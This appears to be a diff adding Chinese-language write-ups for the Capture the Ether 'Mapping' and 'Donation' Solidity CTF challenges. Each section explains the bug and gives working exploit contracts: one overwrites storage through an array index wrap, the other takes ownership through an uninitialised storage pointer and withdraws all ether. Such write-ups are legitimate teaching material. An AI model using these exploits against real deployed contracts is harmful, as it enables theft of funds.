@@ -360,7 +360,7 @@ contract PredictTheBlockHashChallenge {
 
 ## Math
 
-## [Token sale](https://capturetheether.com/challenges/math/token-sale/)
+### [Token sale](https://capturetheether.com/challenges/math/token-sale/)
 
 * 题目
 
@@ -481,7 +481,7 @@ contract exploit {
 
 2. 执行attackerSell()
 
-## [Token whale](https://capturetheether.com/challenges/math/token-whale/)
+### [Token whale](https://capturetheether.com/challenges/math/token-whale/)
 
 * 题目
 
@@ -629,7 +629,181 @@ contract TokenWhaleChallenge {
 
      当然第3步也可以不把所有代币转完，只要第4步多转点就行了。但是要注意工具合约的余额是否大于负溢出所需要的数量。第1,2步也需要改变数量。
 
-  ## [Retirement fund](https://capturetheether.com/challenges/math/retirement-fund/)
+### [Retirement fund](https://capturetheether.com/challenges/math/retirement-fund/)
 
   
 
+### [Mapping](https://capturetheether.com/challenges/math/mapping/)
+
+* 题目
+
+```
+pragma solidity ^0.4.21;
+
+contract MappingChallenge {
+    bool public isComplete;
+    uint256[] map;
+
+    function set(uint256 key, uint256 value) public {
+        // Expand dynamic array as needed
+        if (map.length <= key) {
+            map.length = key + 1;
+        }
+
+        map[key] = value;
+    }
+
+    function get(uint256 key) public view returns (uint256) {
+        return map[key];
+    }
+}
+```
+
+* Write-Up
+
+  这道题考察的知识点是 **solidity底层如何存储storage变量** 的，简单来说storage是一系列插槽，插槽总长度是2^256，每个插槽大小是256位，所以可以做到将一个变量把另外一个变量覆盖了的情况。详见：https://solidity-cn.readthedocs.io/zh/develop/miscellaneous.html
+  
+  思路是利用`map`变量精准覆盖`isComplete`变量，覆盖为1。
+  
+  先上攻击代码，如下：
+
+```
+pragma solidity ^0.4.21;
+
+contract MappingChallenge {
+...
+}
+
+contract exploit{
+    function attacker(address addr) public{
+        bytes32 map_store_storage = keccak256(bytes32(1));
+        uint256 go_to_0_storage = 2**256-1-uint256(map_store_storage)+1;
+        MappingChallenge challeng_contract = MappingChallenge(addr);
+        challeng_contract.set(go_to_0_storage,1);
+    }
+}
+```
+
+比较重要的几点如下：
+
+1. 如何得到`keccak256(bytes32(1))`中的`1`的？
+
+   ```
+   contract MappingChallenge {
+       bool public isComplete;
+       uint256[] map;
+       // 按照storage定义的顺序，
+       ...
+       }
+   ```
+
+
+### [Donation](https://capturetheether.com/challenges/math/donation/)
+
+* 题目
+
+```
+pragma solidity ^0.4.21;
+
+contract DonationChallenge {
+    struct Donation {
+        uint256 timestamp;
+        uint256 etherAmount;
+    }
+    Donation[] public donations;
+
+    address public owner;
+
+    function DonationChallenge() public payable {
+        require(msg.value == 1 ether);
+        
+        owner = msg.sender;
+    }
+    
+    function isComplete() public view returns (bool) {
+        return address(this).balance == 0;
+    }
+
+    function donate(uint256 etherAmount) public payable {
+        // amount is in ether, but msg.value is in wei
+        uint256 scale = 10**18 * 1 ether;
+        require(msg.value == etherAmount / scale);
+
+        Donation donation;
+        donation.timestamp = now;
+        donation.etherAmount = etherAmount;
+
+        donations.push(donation);
+    }
+
+    function withdraw() public {
+        require(msg.sender == owner);
+        
+        msg.sender.transfer(address(this).balance);
+    }
+}
+```
+
+* Write-Up
+
+本题的缺陷在于：`Solidity ^0.4.0`版本，**Unintialised Storage Pointers（未初始化的存储指针），也叫未初始化的 storage 指针**漏洞。
+
+EVM中会将数据存储为 storage 或 memory ，在函数中局部变量的默认类型取决于它们本身的类型，未进行初始化的 storage 变量，会指向合约中的其他变量，从而改变其他变量的值，常见的场景就是指向状态变量，改变状态变量的值，导致漏洞的产生。
+
+```
+function donate(uint256 etherAmount) public payable {
+        // amount is in ether, but msg.value is in wei
+        uint256 scale = 10**18 * 1 ether;
+        require(msg.value == etherAmount / scale);
+        
+		//漏洞所在，实际是指向了storage。
+        Donation donation;
+        
+        //改变donation的值，实际是改变了storage中其他状态变量的值。
+        donation.timestamp = now;//改变了storage插槽0的值
+        donation.etherAmount = etherAmount;//改变了storage插槽1的值
+        ...
+        }
+```
+
+具体查看网址：https://www.anquanke.com/post/id/154407
+
+所以攻击的思路就是通过`donation`的漏洞 覆盖 `owner`变量，改变成为自己的地址即可。
+
+攻击合约代码如下：
+
+```
+pragma solidity ^0.4.21;
+
+contract DonationChallenge {
+...
+}
+
+contract exploit{
+    uint256 value;
+
+    function computeValue()public returns (uint256){
+        uint256 scale = 10**18 * 1 ether;
+        value = uint256(address(this))/scale;
+        return value;
+    }
+
+    function attacter(address addr)public payable{
+        
+        DonationChallenge challengeContract = DonationChallenge(addr);
+        //实际挑战合约会执行donation.etherAmount = uint256(address(this));，即把owner变为uint256(address(this))
+        challengeContract.donate.value(value)(uint256(address(this)));
+        challengeContract.withdraw();
+
+        msg.sender.transfer(address(this).balance);
+    }
+
+    function()payable{
+
+    }
+}
+```
+
+疑问：
+
+攻击合约中`function computeValue()`应该返回value值的，但是remix并不返回任何东西。虽然这个问题不影响攻击合约的使用，实际上uint256 value变量也做了变化。只是感到很奇怪，这是remix的bug吗？尝试用javaVM部署，发现有返回值，但是在ropsten测试网上就没有返回值，可以深入研究。
